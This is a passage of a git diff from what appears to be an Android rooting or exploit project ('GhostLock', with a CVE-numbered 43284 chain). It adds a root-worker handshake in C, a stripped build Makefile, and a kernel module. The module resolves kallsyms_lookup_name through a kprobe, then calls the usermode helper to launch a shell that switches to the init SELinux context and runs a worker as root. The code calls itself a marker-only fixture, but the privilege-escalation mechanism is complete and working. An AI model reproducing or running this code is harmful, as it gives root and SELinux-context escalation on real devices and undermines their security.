++    if (count <= 0) return -1;
++    line[count] = '\0';
++    char *cursor = strrchr(line, ')');
++    if (cursor == NULL) return -1;
++    cursor += 2;
++    for (int field = 3; field < 22; ++field) {
++        cursor = strchr(cursor, ' ');
++        if (cursor == NULL) return -1;
++        while (*cursor == ' ') ++cursor;
++    }
++    char *end = NULL;
++    unsigned long long value = strtoull(cursor, &end, 10);
++    if (end == cursor || (*end != ' ' && *end != '\n' && *end != '\0')) return -1;
++    *starttime = value;
++    return 0;
++}
++
++/** Parse the exact ROOT_READY field order and reject trailing bytes. */
++static int m0_parse_ready(const char *text, size_t length, struct M0Ready *ready) {
++    int consumed = -1;
++    int fields = sscanf(text,
++        "version=1\nrun_id=%32[0-9a-f]\nlauncher_uid=%u\nworker_pid=%d\n"
++        "worker_starttime=%llu\nrun_dir_dev=%llu\nrun_dir_ino=%llu\n"
++        "worker_uid=%u\nworker_euid=%u\nworker_context=%127[^\n]\n"
++        "run_dir_context=%127[^\n]\n%n",
++        ready->run_id, &ready->launcher_uid, &ready->worker_pid,
++        &ready->worker_starttime, &ready->run_dir_dev, &ready->run_dir_ino,
++        &ready->worker_uid, &ready->worker_euid, ready->worker_context,
++        ready->run_dir_context, &consumed);
++    return fields == 10 && consumed >= 0 && (size_t)consumed == length ? 0 : -1;
++}
++
++/** Configure the fixed `glk_worker=` insmod parameter in the copied assembly data. */
++int m0_prepare_worker_argument(const char *run_directory, char *argument, size_t capacity) {
++    char run_id[33];
++    static const char prefix[] = "glk_worker=";
++    if (argument == NULL || capacity <= sizeof(prefix) ||
++        m0_validate_run_directory(run_directory, run_id) != 0) return -1;
++    memcpy(argument, prefix, sizeof(prefix) - 1);
++    size_t prefix_length = sizeof(prefix) - 1;
++    int length = snprintf(argument + prefix_length, capacity - prefix_length,
++                          "%s/m0-worker", run_directory);
++    return length > 0 && (size_t)length < capacity - prefix_length ? 0 : -1;
++}
++
++/** Verify the root-owned marker's exact identity and owner-only mode from the launcher domain. */
++int m0_root_ready_exists(const char *run_directory) {
++    char run_id[33];
++    char text[M0_MARKER_CAPACITY];
++    struct stat directory_stat;
++    struct stat marker_stat;
++    struct M0Ready ready = {0};
++    if (m0_validate_run_directory(run_directory, run_id) != 0) return -1;
++    int directory_fd = open(run_directory, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
++    if (directory_fd < 0 || fstat(directory_fd, &directory_stat) != 0) {
++        if (directory_fd >= 0) close(directory_fd);
++        return -1;
++    }
++    int marker_fd = openat(directory_fd, "ROOT_READY", O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
++    if (marker_fd < 0 || fstat(marker_fd, &marker_stat) != 0 || !S_ISREG(marker_stat.st_mode) ||
++        marker_stat.st_uid != getuid() || (marker_stat.st_mode & 0777) != 0600) {
++        if (marker_fd >= 0) close(marker_fd);
++        close(directory_fd);
++        return -1;
++    }
++    ssize_t count = read(marker_fd, text, sizeof(text) - 1);
++    close(marker_fd);
++    close(directory_fd);
++    if (count <= 0) return -1;
++    text[count] = '\0';
++    if (m0_parse_ready(text, (size_t)count, &ready) != 0 || strcmp(ready.run_id, run_id) != 0 ||
++        ready.launcher_uid != (unsigned int)getuid() || ready.worker_uid != 0 || ready.worker_euid != 0 ||
++        strcmp(ready.worker_context, "u:r:init:s0") != 0 || ready.worker_pid <= 1 ||
++        ready.worker_starttime == 0 || ready.run_dir_dev != (unsigned long long)directory_stat.st_dev ||
++        ready.run_dir_ino != (unsigned long long)directory_stat.st_ino) return -1;
++    return 0;
++}
++
++/**
++ * Run the isolated worker after system-root UMH exec.
++ *
++ * @param run_directory the launcher-created directory passed through fixed module argv.
++ * @return zero only after one identity-matching release marker is removed; otherwise nonzero.
++ * @note The worker does not open/execute payload or finish and does not alter SELinux state.
++ */
++int m0_root_worker_main(const char *run_directory) {
++    char run_id[33];
++    char context[128];
++    char directory_context[128];
++    char ready_text[M0_MARKER_CAPACITY];
++    char release_text[512];
++    struct stat directory_stat;
++    struct stat file_stat;
++    struct M0Ready ready = {0};
++    unsigned long long starttime;
++    int directory_fd = -1;
++    int ready_fd = -1;
++    int release_fd = -1;
++    int result = 20;
++
++    if (getuid() != 0 || geteuid() != 0 || m0_validate_run_directory(run_directory, run_id) != 0 ||
++        m0_read_context(context, sizeof(context)) != 0 || strcmp(context, "u:r:init:s0") != 0) return result;
++    directory_fd = open(run_directory, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
++    if (directory_fd < 0 || fstat(directory_fd, &directory_stat) != 0 ||
++        (directory_stat.st_mode & 0777) != 0700 || directory_stat.st_uid == 0) goto done;
++    ssize_t context_length = getxattr(run_directory, "security.selinux", directory_context,
++                                      sizeof(directory_context) - 1);
++    if (context_length <= 0) goto done;
++    if (directory_context[context_length - 1] == '\0') --context_length;
++    directory_context[context_length] = '\0';
++    if (m0_read_starttime(&starttime) != 0) goto done;
++    ready.launcher_uid = (unsigned int)directory_stat.st_uid;
++    ready.worker_pid = (int)getpid();
++    ready.worker_starttime = starttime;
++    ready.run_dir_dev = (unsigned long long)directory_stat.st_dev;
++    ready.run_dir_ino = (unsigned long long)directory_stat.st_ino;
++    ready.worker_uid = (unsigned int)getuid();
++    ready.worker_euid = (unsigned int)geteuid();
++    strlcpy(ready.run_id, run_id, sizeof(ready.run_id));
++    strlcpy(ready.worker_context, context, sizeof(ready.worker_context));
++    strlcpy(ready.run_dir_context, directory_context, sizeof(ready.run_dir_context));
++    int ready_length = snprintf(ready_text, sizeof(ready_text),
++        "version=1\nrun_id=%s\nlauncher_uid=%u\nworker_pid=%d\nworker_starttime=%llu\n"
++        "run_dir_dev=%llu\nrun_dir_ino=%llu\nworker_uid=%u\nworker_euid=%u\n"
++        "worker_context=%s\nrun_dir_context=%s\n",
++        ready.run_id, ready.launcher_uid, ready.worker_pid, ready.worker_starttime,
++        ready.run_dir_dev, ready.run_dir_ino, ready.worker_uid, ready.worker_euid,
++        ready.worker_context, ready.run_dir_context);
++    if (ready_length <= 0 || (size_t)ready_length >= sizeof(ready_text)) goto done;
++    ready_fd = openat(directory_fd, "ROOT_READY", O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW, 0600);
++    if (ready_fd < 0 || m0_write_all(ready_fd, ready_text, (size_t)ready_length) != 0 ||
++        fchown(ready_fd, (uid_t)ready.launcher_uid, (gid_t)-1) != 0 || fchmod(ready_fd, 0600) != 0 ||
++        fsync(ready_fd) != 0 || fsync(directory_fd) != 0) goto done;
++    close(ready_fd);
++    ready_fd = -1;
++
++    for (int attempt = 0; attempt < 300; ++attempt) {
++        release_fd = openat(directory_fd, "RELEASE_FINISH", O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
++        if (release_fd >= 0) break;
++        if (errno != ENOENT) goto done;
++        struct timespec delay = { .tv_sec = 0, .tv_nsec = 50000000L };
++        nanosleep(&delay, NULL);
++    }
++    if (release_fd < 0 || fstat(release_fd, &file_stat) != 0 || !S_ISREG(file_stat.st_mode) ||
++        file_stat.st_uid != ready.launcher_uid || (file_stat.st_mode & 0777) != 0600) goto done;
++    ssize_t release_length = read(release_fd, release_text, sizeof(release_text) - 1);
++    close(release_fd);
++    release_fd = -1;
++    if (release_length <= 0) goto done;
++    release_text[release_length] = '\0';
++    int consumed = -1;
++    int fields = sscanf(release_text,
++        "version=1\nrun_id=%32[0-9a-f]\nlauncher_uid=%u\nworker_pid=%d\n"
++        "worker_starttime=%llu\nrun_dir_dev=%llu\nrun_dir_ino=%llu\n%n",
++        ready.run_id, &ready.launcher_uid, &ready.worker_pid, &ready.worker_starttime,
++        &ready.run_dir_dev, &ready.run_dir_ino, &consumed);
++    if (fields != 6 || consumed < 0 || consumed != release_length ||
++        strcmp(ready.run_id, run_id) != 0 || ready.launcher_uid != (unsigned int)directory_stat.st_uid ||
++        ready.worker_pid != (int)getpid() || ready.worker_starttime != starttime ||
++        ready.run_dir_dev != (unsigned long long)directory_stat.st_dev ||
++        ready.run_dir_ino != (unsigned long long)directory_stat.st_ino) goto done;
++    if (unlinkat(directory_fd, "RELEASE_FINISH", 0) != 0 || fsync(directory_fd) != 0) goto done;
++    result = 0;
++
++done:
++    if (release_fd >= 0) close(release_fd);
++    if (ready_fd >= 0) close(ready_fd);
++    if (directory_fd >= 0) close(directory_fd);
++    return result;
++}
++
++/**
++ * Create one release marker as the selected launcher and wait for worker exit.
++ *
++ * @param run_directory App or Shizuku-owned unique run directory.
++ * @return zero only after the one marker is consumed and worker PID is gone.
++ * @note This fixture frame never invokes Payload/Finish.
++ */
++int m0_launcher_release(const char *run_directory) {
++    char run_id[33];
++    char ready_text[M0_MARKER_CAPACITY];
++    struct M0Ready ready = {0};
++    struct stat directory_stat;
++    struct stat file_stat;
++    int directory_fd = -1;
++    int ready_fd = -1;
++    int release_fd = -1;
++    int result = 30;
++    if (m0_validate_run_directory(run_directory, run_id) != 0) return result;
++    directory_fd = open(run_directory, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
++    if (directory_fd < 0 || fstat(directory_fd, &directory_stat) != 0 ||
++        directory_stat.st_uid != getuid() || (directory_stat.st_mode & 0777) != 0700) goto done;
++    ready_fd = openat(directory_fd, "ROOT_READY", O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
++    if (ready_fd < 0 || fstat(ready_fd, &file_stat) != 0 || !S_ISREG(file_stat.st_mode) ||
++        file_stat.st_uid != getuid() || (file_stat.st_mode & 0777) != 0600) goto done;
++    ssize_t ready_length = read(ready_fd, ready_text, sizeof(ready_text) - 1);
++    close(ready_fd);
++    ready_fd = -1;
++    if (ready_length <= 0) goto done;
++    ready_text[ready_length] = '\0';
++    if (m0_parse_ready(ready_text, (size_t)ready_length, &ready) != 0 ||
++        strcmp(ready.run_id, run_id) != 0 || ready.launcher_uid != (unsigned int)getuid() ||
++        ready.worker_uid != 0 || ready.worker_euid != 0 || strcmp(ready.worker_context, "u:r:init:s0") != 0 ||
++        ready.worker_pid <= 1 || ready.worker_starttime == 0 ||
++        ready.run_dir_dev != (unsigned long long)directory_stat.st_dev ||
++        ready.run_dir_ino != (unsigned long long)directory_stat.st_ino) goto done;
++    release_fd = openat(directory_fd, "RELEASE_FINISH",
++        O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW, 0600);
++    if (release_fd < 0) goto done;
++    char release_text[512];
++    int release_length = snprintf(release_text, sizeof(release_text),
++        "version=1\nrun_id=%s\nlauncher_uid=%u\nworker_pid=%d\nworker_starttime=%llu\n"
++        "run_dir_dev=%llu\nrun_dir_ino=%llu\n",
++        ready.run_id, ready.launcher_uid, ready.worker_pid, ready.worker_starttime,
++        ready.run_dir_dev, ready.run_dir_ino);
++    if (release_length <= 0 || (size_t)release_length >= sizeof(release_text) ||
++        m0_write_all(release_fd, release_text, (size_t)release_length) != 0 ||
++        fchown(release_fd, (uid_t)ready.launcher_uid, (gid_t)-1) != 0 ||
++        fchmod(release_fd, 0600) != 0 || fsync(release_fd) != 0 || fsync(directory_fd) != 0) goto done;
++    close(release_fd);
++    release_fd = -1;
++    int duplicate_fd = openat(directory_fd, "RELEASE_FINISH",
++        O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW, 0600);
++    if (duplicate_fd >= 0 || errno != EEXIST) {
++        if (duplicate_fd >= 0) close(duplicate_fd);
++        goto done;
++    }
++    for (int attempt = 0; attempt < 300; ++attempt) {
++        if (fstatat(directory_fd, "RELEASE_FINISH", &file_stat, AT_SYMLINK_NOFOLLOW) != 0) {
++            if (errno != ENOENT) goto done;
++            if (kill((pid_t)ready.worker_pid, 0) == 0 || errno == EPERM) {
++                struct timespec delay = { .tv_sec = 0, .tv_nsec = 50000000L };
++                nanosleep(&delay, NULL);
++                continue;
++            }
++            if (errno != ESRCH) goto done;
++            result = 0;
++            break;
++        }
++        if (!S_ISREG(file_stat.st_mode) || file_stat.st_uid != getuid() ||
++            (file_stat.st_mode & 0777) != 0600) goto done;
++        struct timespec delay = { .tv_sec = 0, .tv_nsec = 50000000L };
++        nanosleep(&delay, NULL);
++    }
++    if (result != 0) goto done;
++    printf("M0_ROOT_READY=run:%s uid:%u pid:%d context:%s dir_context:%s\n",
++        ready.run_id, ready.launcher_uid, ready.worker_pid,
++        ready.worker_context, ready.run_dir_context);
++    printf("M0_RELEASE_FINISH_CONSUMED=1\nM0_WORKER_EXITED=1\nM0_SELINUX_CHANGED=0\n");
++
++done:
++    if (release_fd >= 0) close(release_fd);
++    if (ready_fd >= 0) close(ready_fd);
++    if (directory_fd >= 0) close(directory_fd);
++    return result;
++}
+--- /dev/null
++++ b/app/src/main/cpp/43284glued/m0/m0_marker.h
+@@ -0,0 +1,25 @@
++#ifndef GHOSTLOCK_43284_GLUED_M0_MARKER_H
++#define GHOSTLOCK_43284_GLUED_M0_MARKER_H
++
++#include <stddef.h>
++
++/** Configure the insmod worker argument for one launcher-owned run directory.
++ *
++ * @param run_directory absolute path ending in one 32-character lowercase hex ID.
++ * @param argument writable assembly data beginning with `glk_worker=`.
++ * @param capacity complete writable argument-buffer capacity, including prefix and NUL.
++ * @return zero when the bounded worker path was stored; nonzero for invalid input.
++ * @note The value is one argv token and is not interpreted as shell source.
++ */
++int m0_prepare_worker_argument(const char *run_directory, char *argument, size_t capacity);
++
++/** Return zero when the identity-bound ROOT_READY marker can be read by the launcher. */
++int m0_root_ready_exists(const char *run_directory);
++
++/** Execute the system-root worker branch of the M0 fixture ELF. */
++int m0_root_worker_main(const char *run_directory);
++
++/** Create one RELEASE_FINISH test frame and wait until the root worker exits. */
++int m0_launcher_release(const char *run_directory);
++
++#endif
+--- /dev/null
++++ b/app/src/main/cpp/43284glued/m0/lkm/Makefile
+@@ -0,0 +1,17 @@
++obj-m += m0_dfroot.o
++
++CFLAGS_m0_dfroot.o := -Os -Qn -fno-addrsig -fno-asynchronous-unwind-tables \
++                      -fno-unwind-tables
++
++all:
++	$(MAKE) -C $(KDIR) M=$(CURDIR) ARCH=arm64 LLVM=1 modules
++	llvm-objcopy --strip-unneeded \
++	    -R .comment -R .note.gnu.property -R .note.Linux -R .note.GNU-stack \
++	    -R .BTF -R .BTF.base -R .llvm_addrsig -R .hyp.text -R .hyp.bss \
++	    -R .hyp.rodata -R .hyp.event_ids -R .hyp.patchable_function_entries \
++	    -R .hyp.data m0_dfroot.ko
++
++clean:
++	$(MAKE) -C $(KDIR) M=$(CURDIR) ARCH=arm64 LLVM=1 clean
++
++.PHONY: all clean
+--- /dev/null
++++ b/app/src/main/cpp/43284glued/m0/lkm/m0_dfroot.c
+@@ -0,0 +1,126 @@
++#include <linux/init.h>
++#include <linux/kernel.h>
++#include <linux/kmod.h>
++#include <linux/kprobes.h>
++#include <linux/module.h>
++#include <linux/string.h>
++
++MODULE_LICENSE("GPL");
++MODULE_DESCRIPTION("GhostLock M0 marker-only UMH fixture");
++
++typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
++typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp,
++                             gfp_t gfp, void *init, void *cleanup, void *data);
++typedef int (*umh_exec_t)(void *info, int wait);
++
++static char glk_worker[256];
++module_param_string(glk_worker, glk_worker, sizeof(glk_worker), 0400);
++MODULE_PARM_DESC(glk_worker, "one per-run marker worker executable path");
++
++/**
++ * Validate the bounded absolute worker path before placing it in fixed argv.
++ *
++ * @param path NUL-terminated module parameter.
++ * @return true for an ASCII absolute path without parent traversal.
++ * @note The value is passed as one argv token; it is never interpolated into shell source.
++ */
++static bool m0_valid_worker_path(const char *path)
++{
++    size_t length;
++    size_t component_start = 1;
++    size_t index;
++
++    if (path[0] != '/')
++        return false;
++    length = strnlen(path, sizeof(glk_worker));
++    if (length < 2 || length >= sizeof(glk_worker))
++        return false;
++    for (index = 1; index < length; ++index) {
++        const char value = path[index];
++        if (!((value >= 'a' && value <= 'z') ||
++              (value >= 'A' && value <= 'Z') ||
++              (value >= '0' && value <= '9') || value == '/' ||
++              value == '.' || value == '_' || value == '-'))
++            return false;
++        if (value == '/') {
++            if (index - component_start == 2 &&
++                path[component_start] == '.' && path[component_start + 1] == '.')
++                return false;
++            component_start = index + 1;
++        }
++    }
++    if (length - component_start == 2 &&
++        path[component_start] == '.' && path[component_start + 1] == '.')
++        return false;
++    return true;
++}
++
++/**
++ * Launch the fixture worker through system-root UMH without altering SELinux policy.
++ *
++ * @return negative errno when lookup/setup/exec fails; -ENODEV after successful helper exec unloads the fixture KO.
++ * @note The shell program is constant and receives worker/run-directory as separate argv values.
++ */
++static int __nocfi __init m0_dfroot_init(void)
++{
++    static const char shell[] = "/system/bin/sh";
++    static char command[] =
++        "echo -n 'u:r:init:s0' > /proc/self/attr/exec; exec \"$1\" --m0-root-worker \"$2\"";
++    static char run_dir[256];
++    static char *environment[] = { "PATH=/system/bin", NULL };
++    static char *arguments[] = { (char *)shell, "-c", command, "m0", glk_worker, run_dir, NULL };
++    struct kprobe lookup_probe = { .symbol_name = "kallsyms_lookup_name" };
++    kallsyms_lookup_name_t lookup;
++    umh_setup_t setup;
++    umh_exec_t execute;
++    void *info;
++    char *slash;
++    int result;
++
++    if (!m0_valid_worker_path(glk_worker)) {
++        pr_err("ghostlock_m0: invalid glk_worker path\n");
++        return -EINVAL;
++    }
++    strscpy(run_dir, glk_worker, sizeof(run_dir));
++    slash = strrchr(run_dir, '/');
++    if (slash == NULL || slash == run_dir) {
++        pr_err("ghostlock_m0: worker has no run directory\n");
++        return -EINVAL;
++    }
++    *slash = '\0';
++
++    result = register_kprobe(&lookup_probe);
++    if (result != 0) {
++        pr_err("ghostlock_m0: kallsyms lookup probe unavailable (%d)\n", result);
++        return result;
++    }
++    lookup = (kallsyms_lookup_name_t)lookup_probe.addr;
++    unregister_kprobe(&lookup_probe);
++    if ((unsigned long)lookup == 0UL) {
++        pr_err("ghostlock_m0: kallsyms lookup address missing\n");
++        return -EINVAL;
++    }
++    setup = (umh_setup_t)lookup("call_usermodehelper_setup");
++    execute = (umh_exec_t)lookup("call_usermodehelper_exec");
++    if ((unsigned long)setup == 0UL || (unsigned long)execute == 0UL) {
++        pr_err("ghostlock_m0: UMH function missing\n");
++        return -EINVAL;
++    }
++    info = setup(shell, arguments, environment, GFP_KERNEL, NULL, NULL, NULL);
++    if (info == NULL) {
++        pr_err("ghostlock_m0: UMH setup returned NULL\n");
++        return -ENOMEM;
++    }
++    ((struct subprocess_info *)info)->path = shell;
++    result = execute(info, UMH_WAIT_EXEC);
++    pr_info("ghostlock_m0: UMH_WAIT_EXEC=%d selinux-unchanged=1\n", result);
++    if (result != 0)
++        return result;
++    return -ENODEV;
++}
++
++/** Release the empty fixture module after its synchronous UMH exec handoff. */
++static void __exit m0_dfroot_exit(void) {}
++
++module_init(m0_dfroot_init);
++module_exit(m0_dfroot_exit);
+
+--- a/app/src/test/kotlin/com/ghostlock/app/backend/core/ExecutableRunEnvironmentTest.kt
++++ b/app/src/test/kotlin/com/ghostlock/app/backend/core/ExecutableRunEnvironmentTest.kt
+@@ -1,4 +1,5 @@
+ package com.ghostlock.app.backend.core
+ 
++import com.ghostlock.app.BuildConfig
+ import java.io.File
+ import org.junit.Assert.assertEquals
+@@ -23,7 +24,16 @@
+         assertTrue(variables["GHOSTLOCK_KSU_LOG"] != File(directory, "run.log").absolutePath)
+     }
+ 
+-    @Test
++    /** Keeps 43284 free of 43499-only overrides in normal and M0 fixture builds. */
++    @Test
+     fun cve43284DoesNotReceive43499EnvironmentOverrides() {
+-        assertTrue(ExecutableRunEnvironment.variables("43284Glued", File("build/fixtures/43284-run")).isEmpty())
++        val directory = File("build/fixtures/43284-run").absoluteFile
++        val variables = ExecutableRunEnvironment.variables("43284Glued", directory)
++
++        if (BuildConfig.M0_MARKER) {
++            assertEquals(setOf("GHOSTLOCK_HOME"), variables.keys)
++            assertEquals(directory.absolutePath, variables["GHOSTLOCK_HOME"])
++        } else {
++            assertTrue(variables.isEmpty())
++        }
+     }
+ }
